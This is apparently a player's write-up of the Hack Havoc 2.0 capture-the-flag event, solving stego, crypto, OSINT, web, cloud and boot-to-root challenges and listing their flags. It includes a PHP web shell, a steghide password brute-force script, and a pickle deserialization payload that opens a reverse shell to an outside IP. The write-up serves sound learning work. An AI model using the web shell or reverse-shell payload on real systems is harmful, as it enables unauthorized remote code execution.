- **Welcome to Hack Havoc 2.0 CTF!**  
- Some how i liked  this ctf & Placed in 6TH Position.  
- **what Made me intrest ?**
- Prizes  
- PJPT Certification by TCM  
- HackTheBox Gift Voucher (3 Months VIP) + Ebook  
- Top 10 Participants: 1-hour Career Consultation with Cybersecurity Leader  
- Top 20 Participants: Access to internship opportunities at CyberMaterial and 911Cyber**  

<img src="Images/CTF.jpg" alt="Challenge Image" width="200"/>

--------

Challenge - Bonus  
**Challenge** - **Welcome To CyberMaterial**
> **Welcome to Hack Havoc 2.0. The Premiere CTF Hosted by Cybermaterial.**  
> Before we start the journey, let's make a detour to our Discord Server and Instagram.  
> Friends are crucial for every adventure ...
> 
> [Discord](https://discord.com/invite/ATw3qYMX7e)  
> [Instagram](https://www.instagram.com/cybermaterial_/)  
> [LinkedIn](https://www.linkedin.com/company/cybermaterial/)
> 
> Don't forget to give us a follow
> 
> **Flag Format:** `CM{String}`

At starting i am not able to figure out where to find first part of flag. After exploring discord options, I decided to try Discord bot, and using commands, I totally played with all discord command's i get to know i can execute command & get information so i directly excuted /flag 😁 & we all know where 2nd part of flag is located....... Instagram https://www.instagram.com/cybermaterial_/ 

--------------------

**Challenge** - **Bonus**  
> Want to grab some easy points? Here’s your chance! All you have to do is follow CyberMaterial on LinkedIn and send us a screenshot as proof on Google Form. Once we verify, we’ll add 10 points to your score.📈
> URL : https://www.linkedin.com/company/cybermaterial
>
> Already following us? No problem! Send us a screenshot, and you’ll still get the points. 😊
>
> Plus, if you keep following us, you’ll earn bonus points for our next CTF event. Of course, we’ll verify that you’re still a follower when the time comes!
>
> Good luck! 🔥
>
> https://forms.gle/nF4eTtEJAHepKVdy6
> Just follow there linkedin page, take screenshot & upload it on google form. They automatically added point's who ever filled google form.
>
---
**Challenge** - **FeedBack**
>Flag you will be getting on mail
>
>https://forms.gle/MtgWRp67i7n2QZJ86

Fill there feedback form you will get flag. Bruhh my eye's dead at that time literally 🥲 i got a mail but the thing is that flag is in a picture thb i due to sleepy mood i didn't recognized O & 0 Lost my 3 tries. Contacted Admin after realizing He incresed one attempt 😅 <img src="Images/FeedBack.png" alt="Challenge Image" width="200"/>

------------------------------

**Category** - **Mobile**  
**Challenge** - **APK-ocalypse Now!**
> Put on your detective hat and dive into our mysterious APK! Get it and uncover hidden treasures—will it be memes, cat videos, or just code? Get ready to crack the APK-ocalypse!
> **Access File in Challenge-Files/hackhavoc.apk**

Pretty Easy one, Opned my jadx-gui you know when ever we open apk file we will start analyzing code & **.xml** Files But why ? **Extensible Markup Language (XML) define and store data in a shareable manner** . So checked all main .xml files **PZ{U1qq3a_7Y4t_1a_Z4aVS35G}** this is something looked suspesious & we alway's like to decrypt stuff 🤡, Some how i felt it is ROT 13 Started with that i got Flag brooo

**CM{H1dd3n_7L4g_1n_M4nIF35T}**

------------------------------


**Category** - **Stego**
**Challenge** - **Incidents in Disguise**
> Is this an image or a game of Hide and Seek? Between the incidents of May and June, secrets lurk in the pixels! Something reversing makes things easier. Lets Rock!!
> Hint's
>  Incidents in Disguise Reverse You Rock with the latest one  and try with some top you Rock list password contains: amos amos amos 
>  Incidents in Disguise You Rock You Rock You Rock  Now backtrack the file and hint XD.

This challenge i was not able to solve at starting cause don't know the password to do steganography. After Few Hint's i get to know we need to use New Rockyou.txt According to Hint's **amos** is something they stressed so i greped amos from rockyou.txt [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) Many people asked me which rockyou & tool need to use i suggested this one & this worked for me.

```bash
sudo apt-get install steghide -y
cat rockyou.txt | grep "amos" > pass.txt
```
```bash
#!/bin/bash
image="file.jpg"
wordlist="pass.txt"

while read password; do
    echo "Trying password: $password"
    steghide extract -sf "$image" -p "$password" -f > /dev/null 2>&1

    if [ $? -eq 0 ]; then
        echo "[+] Success! Password found: $password"
        exit 0
    fi
done < "$wordlist"

echo "[-] No password found in the wordlist."
```

```bash
./req.sh
```
Finally after running this you will get to know this is password is ***7¡Vamos!**

```bash
steghide  steghide extract -sf file.jpg -p *7¡Vamos!
cat flag.txt
**CM{Bru73_f0rc3_i5_b35t}**
```

<!-- -->

**Challenge** - **p13ces**
> Once upon a time in the land of pixels, a sneaky group of flags decided to hide in the most unexpected places—inside ordinary images! ☠️ Your quest, brave adventurer, is to embark on a > pixelated treasure hunt. Help Lira uncover the hidden pieces, decode the message, and craft the legendary flag.
>
> Flag Formate : CM{}
>
>https://sites.google.com/cybermaterial.com/lira-journey/

Starting i am thinking why this weird website ??? after carefully seeing some text in picture ????? yeah...  
I had seen source page to see other pictures 

<img src="Images/Steg-1.png" alt="Challenge Image" width="200"/>


[image-1](https://sites.google.com/cybermaterial.com/lira-journey/)  
[image-2](https://sites.google.com/cybermaterial.com/lira-journey/the-woods)  
[image-3](https://sites.google.com/cybermaterial.com/lira-journey/the-woods/the-escape?authuser=0)  

After case fully seeing some text is locked in picture i tried to combined all 3 it shown something like this.  
<img src="Images/Combine.jpg" alt="Challenge Image" width="200"/>  
What is **P13ces}** Ofcource it is last 1/4th flag... what about remaining ? I had no clue what to do ....... But each image had a sequence number so i started going steganography with steghide 
They maintained a sequence you don't need any Password to extract image 1, but you need for image 2, but what is password for image 2? what ever part of flag in extracted text in image 1...... loop continues up to 4.

```bash
steghide extract -sf 1.jpg
 cat part-1-flag.txt

steghide extract -sf 2.jpg
cat part-2-flag.txt

steghide extract -sf 3.jpg
cat part-3-flag.txt

steghide extract -sf 4.jpg
cat part-4-flag.txt 
```

```bash
image - 1 ( Lira walked through the quiet village at dusk, her thoughts wandering as she crossed the old bridge.  She noticed something strange about the stone railing—a small, engraved marking. She traced her finger over it and uncovered a hidden message: **{Break_** )

image - 2 ( Deep in the forest, Lira found a strange rock formation. Beneath one of the stones, another engraving appeared: "**1t**". The pieces were falling into place, but the meaning still escaped her )

image - 3 ( As Lira ventured further, she stumbled upon an abandoned cabin. Inside, hidden in the floorboards, was yet another piece of the puzzle:  Visit this site and get your part: https://pastebin.com/V3nbr0sm.**_1int0_** The mystery was growing, and the answers seemed just out of reach.  )

image - 4 (  At last, Lira reached the heart of the forest, where a small clearing lay undisturbed. In the center, a worn parchment was pinned to the ground. Written on it was the a riddle that can contain the final clue: 

"In the realm of shapes, I’m the base of a square
In the world of shapes, I form a perfect square,
A hint lies in balance; I help you explore,
Count me well, and you’ll see I am more.
I'm just a single digit number, all alone."

It dawned on her, she had to put all the pieces together to unlock the final part of the 5 pieces hidden message.

FLAG: CM{xxxxx_#x_#xxx#_#_x##xxx} )

```

<!-- -->


After seeing flag format CM{xxxxx_#x_#xxx#_#_x##xxx} i had connected all pieces P13ces}, {Break_, 1t, _1int0_.  
**CM{Break_1t_1int0_4_p13ces}**


---


**Category** - **OSINT**  
**Challenge** - **Hack Uncovered**
> Think you can find the flag buried in a sea of data? This PDF is packed with juicy details about July's 2024 incidents/alerts, but beware 
> somewhere within lies your prize! Can you navigate the top threats, Vulnerability, and regulations to uncover what’s hidden? and Craft the flag > with the name Put your OSINT skills to the test! 🕵️‍♀️📄              Flag : CM{a_b_c}

I feel my self i sooo good at osint challenges lol 😅 but this osint challenges didn't feel up to the mark.
Please look challenge file in **Challenge-Files/Hack Uncovered.pdf**

They clearly menctioned to search about **top threats**, **Vulnerability**, **regulations** After calefully reviewing

**Top Threats = DarkGate**  
**Vulnerability = CVE-2024-5217**  
**regulations = KOPSA**  
Combining this we get flag  
**CM{DarkGate_CVE-2024-5217_KOPSA}**  


**Challenge** - **CyberMaterial Edition!**
> Hall of Hacks July 2024 Edition delves into the latest cybersecurity triumphs and crises, spotlighting top threat actors from hacktivists to >cybercriminals, alongside major breaches, legal battles, and industry-shaping developments.
> 
> But wait—there’s a hidden flag buried among the chaos!

For this challenge i searched a lottt...... & Finall i got a linkedin post with same descreption but at starting those pictures didn't shown anything. And i read challenge descreption again **But wait—there’s a hidden flag buried among the chaos!** & Then i clearly seen all images again & then i got it  
<img src="Images/CyberMaterial Edition!.png" alt="Challenge Image" width="200"/>  


-----


**Category** - **REV**  
**Challenge** - **More Like ‘Enig-me’**

> The Enigma Machine was a complex encryption device used by the German military during World War II. Its intricate design and multiple settings > made it incredibly difficult to crack. In this challenge, you'll take on the role of a codebreaker and attempt to decipher a message encrypted > using a modified Enigma Machine.
>
> Encoded txt : ugtyq djiwc ruejq ebdux hcrqr kiznu hokzy sngry zfxnv gbjki dqknr ma
> 
> Decoded txt: cybermateial is the world number one cybersecurity data platform.
> 
> Your flag follows the format CM{Rotor_x-x-x_Pos_x-x-x_Reflector_x_Plug_x-x_x-x_Ring_x-x-x}. Good luck decoding the mystery!"

>Update:More Like ‘Enig-me’
>Challenge is updated 
>Rotor:
>Hint: "These are the first three rotors historically used by the German military Enigma during WWII."
>Position:
>Hint: "The initial rotor positions are aligned with the start of the alphabet but include two letters beyond the first."
>Reflector:
>Hint: "This reflector was the most commonly used during the war, and it shares its name with the second letter of the alphabet."
>Plugboard:
>Hint: "The plugboard swaps involve pairs of letters commonly found at the start of words like 'Apple' and 'Tree,' and 'Banana' and 'Lemon.'"
>Ring Position:
>Hint: "The rings are set to the beginning of the alphabet, leaving no shifts at all."

For this chall i had used hint's they clearly menctioned where what to use.  
<img src="Images/Enigma.png" alt="Challenge Image" width="200"/>  
**CM{Rotor_I-II-II_Pos_A-D-F_Reflector_B_Plug_A-T_B-L_Ring_A-A-A}**


---------

**Category** - **MISC**  
**Challenge** - **The Case of the Missing Flag**


> Congratulations, detective! You’ve found ABC.dat, the file that’s about as exciting as watching paint dry. But wait! Rumor has it there’s a flag tucked away in there, possibly hiding RQ.
> 
> Can you solve the mystery before your snacks run out? Get cracking, and may the bytes be ever in your favor!

First what is .dat file ???? **a data file that stores information specific to the program that created it** So we can open it in notepad right ??
I got some svg file in that which look's a Qr code. So i converted it to a Png file & then scanned with google len's i don't know why it didn't scanned. And then again i scanned with a qr code Scanner app **CM{F0r3n3ic_1s_34sy}** this flag appeared. 


------------

**Category** - **CRYPTO**  
**Challenge** - **The Curious Case of the Jumbled Symbols**
>Dive into a tangled web of characters! Can you decode {╵⸍⸝╮ᛁ⸌ᛁ╵╵_◟╮ᛁ⸜╵_ᛙ╮ᚽ⸝◟ᛍ} ? Here’s a clue: It’s not what it seems—things aren’t always as clear as they appear. Good luck, puzzle master!
>
>Wrap Flag in CM{}
>

This challenge is as easy as it. I just pased this ( ╵⸍⸝╮ᛁ⸌ᛁ╵╵_◟╮ᛁ⸜╵_ᛙ╮ᚽ⸝◟ᛍ ) on google i get to know it is (rune-translator) 
 [https://valhyr.com/pages/rune-translator]  
<img src="Images/crypto-1.png" alt="Challenge Image" width="200"/>  



**Challenge** - **CyberMaterialHavoc**

>We heard you're a great CybermaterialHavoc! 🧙‍♂️ Help us decode this baffling message: 🕵️‍♀️💥
>
>AgTIEe5hQ?T5,W.GDyv^N*eRcDuEoizyHNSTN&b$$4m0o9gWL!S\u+^T;/o5m/9YL@HQlje}

In Hint's they already menctioned this will be a 3 level encryption So i opned (dcode)[https://www.dcode.fr/cipher-identifier]

- In Level one it detected it as Base 92 after decrypting i got this ZL{YfphiGdxdicgo_Yzkqu'i_Cmtg_Qfpdiscxawtiz_Xdxl_Khdxcltu}
- Again i used dcode.fr this time it dected as Vigenere Cipher. But wait what key can be???? The only thing they highlighted  is CybermaterialHavoc
  So i used it & then this decrypted to XN{XbyviNzgvirzo_Dliow'h_Yvhg_Xbyvihvxfirgb_Wzgz_Kozgulin}
- Again i used decode.fr this dected as Atbash Cipher so i used it, this one provided me a flag **CM{CyberMaterial_World's_Best_Cybersecurity_Data_Platform}** another easy challenge 




----



**Category** - **Boot To Root**  
**Challenge** - **Hacker's Fortress**  

> In this boot-to-root exercise, participants will need to leverage their skills in file uploading and privilege escalation to uncover a hidden flag. The challenge simulates a real-world scenario where unauthorized access to a server must be achieved to find sensitive information.
> 
> http://35.208.110.64


At starting i got fooled & tired many thing's like jpg, png, jpg for shell. That didn't worked. What i did is uploded a php shell 

```php
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
```

```HTML
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
 Just upload this & then open your uploded file in /uploads. And see what file are existing on server  & Hidden file tooo. **ls -a**
Hheheh we got a flag   **CTF{3sc4l4t3d_t0_r00t}**



-------

**Category** - **web**  
**Challenge** - **Hashing Numbers**


> To access its secrets, you must first prove your worth by calculating a mathematical expression, a test of both intellect and skill. Will you rise to the challenge and secure the sensitive information, or will the secrets remain forever locked away? The choice is yours.

> Flag structure: CM{XXX-###_##}
>
>https://sites.google.com/cybermaterial.com/hashing-numbers

I was not able to figure out what to do i thought of executing **shell=0&pwn=1** didn't worked. After reading Descreption again & One of my friend given Hint to inspect page & i got this.  
<img src="Images/Hashing Numbers.png" alt="Challenge Image" width="200"/>  




**Challenge** - **Dir Dash**  

> Welcome to the wackiest web quest of your life! 🚀 Somewhere in the depths of our webpage jungle you have Me.Let the digital madness begin! 🕵️‍♂️💻💥
>
> http://edition1.ctf.cybermaterial.com/

< **Hints** >
> Hint for Dir Dash Domain//////hash............extensions
> hash as a directory and extensions with a hash what a combination lol
> Dir  as a hash  OR  hash as a dir Or extensions  with a hash 


After reading Hint's i got they stressed is **Domain//////hash............extensions** So i tried brute force i got http://edition1.ctf.cybermaterial.com/robots.txt in this i got 2 hashes **c5ba7ff1883453170f7590fa689f1f48**, ***M8PQFA3ELTD%4BIA73EZ2** . For *M8PQFA3ELTD%4BIA73EZ2 i was not able decrypt it any way & i thought c5ba7ff1883453170f7590fa689f1f48 is valid. And i brute fourced using this one...... https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/File-Extensions-Wordlist.txt  like http://edition1.ctf.cybermaterial.com/c5ba7ff1883453170f7590fa689f1f48.FUFF Finally i got 1 200 ok ( http://edition1.ctf.cybermaterial.com/c5ba7ff1883453170f7590fa689f1f48.aspx ) & Sucessfully got flag.



**Challenge** - **Pickle Me This Cookie Jar Shenanigans!**  

> Ever wondered what your cookies are hiding? This challenge dives into the mysterious world of serialized cookies with a twist of deserialization vulnerability. Use your Python skills and the pickle module to create a mischievous cart item that leads to a netcat reverse shell. Follow the breadcrumbs, set your traps, and see if you can hack your way to victory

TBH at starting i know nothing about deserialization vulnerability seen few youtube video's & blogs to know how it work's 
 ( https://www.youtube.com/watch?v=qt15PnF8x-M ) ,( https://www.youtube.com/watch?v=NfLGOuHLjIo ) Helped me a lot.

 
```shell
#!/usr/bin/env python3
import pickle
import os
import base64
import requests

class RCE(object):
    def __reduce__(self):
        return (os.system,('''export RHOST="54.226.234.236";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")' ''',))

def main():
    pickledPayload = base64.b64encode(pickle.dumps(RCE())).decode()
    print(f'[*] Generated malicious cookie payload: {pickledPayload}')

if __name__ == '__main__':
    main()
```

After executinh rever shell i got controll in flag.md there is a flag **CM{c0Ngr47S_y0u_ArE_A_Ser1A1_KI11er}**

----------------

 
**Category** - **Forensic**  
**Challenge** - **QR-azy Mystery!**  

> Can you turn this pixel mush into glory?

- Please view file in Challenge-Files/goneeeee.png.

  Easy challenge, I used my phone unblur option on my phone & then scanned with google len's that worked for me.



**Challenge** - **Dialing for Danger**  


>Oops! Two not-so-smooth criminals just spilled the beans during a phone chat on a brick phone! 📞🎶 Crack the location before their next mischief unfolds. Find the place befor attack
>
>Flag: Wrap it in CM { First_second_third }

- Access Challenge files in Challenge-Files/4_666_555_3_33_66_0_4_2_8_33_0_22_7.txt

Simple challenge &The given sequence of numbers, 4 666 555 3 33 66 0 4 2 8 33 0 22 777 444 3 4 33, looks like a message encoded using a classic phone keypad system. In this system, each number corresponds to specific letters (e.g., 2 = ABC, 3 = DEF, and so on).
- 4 666 555 3 33 66 = GOLDEN
- 4 2 8 33 = GATE
- 22 777 444 3 4 33 = BRIDGE

**CM{Golden_Gate_Bridge}**




----


**Category** - **cloud**  
**Challenge** - **Cloudy Records**  

> A sensitive data leak has occurred at the fictional company "CloudCorps." As a security expert, your job is to find their exposed Cloud Storage bucket and retrieve the flag.
>
> https://hallofhacks.com/

I got fooled in this challenge lol. i useed many tool's like  cloud enum & many online tool's to find upen bucket's nothing worked. I had aked on ctf-general discord group, One guy replyied and asked what you did up to - i said i had finded domain information & enumerating open bucket's And then he said start again from domain information. Then i started digging txt, dns, mail server  records sucessfully in dns records i got a open bucket link ( https://storage.googleapis.com/cloudcorps-important ) in 3rd bucket i got flag - https://storage.googleapis.com/cloudcorps-important/Hall_of_Hacks_2.pdf    **CM{GCP_CloudStorage_Bucket_Challenge_20241018}**







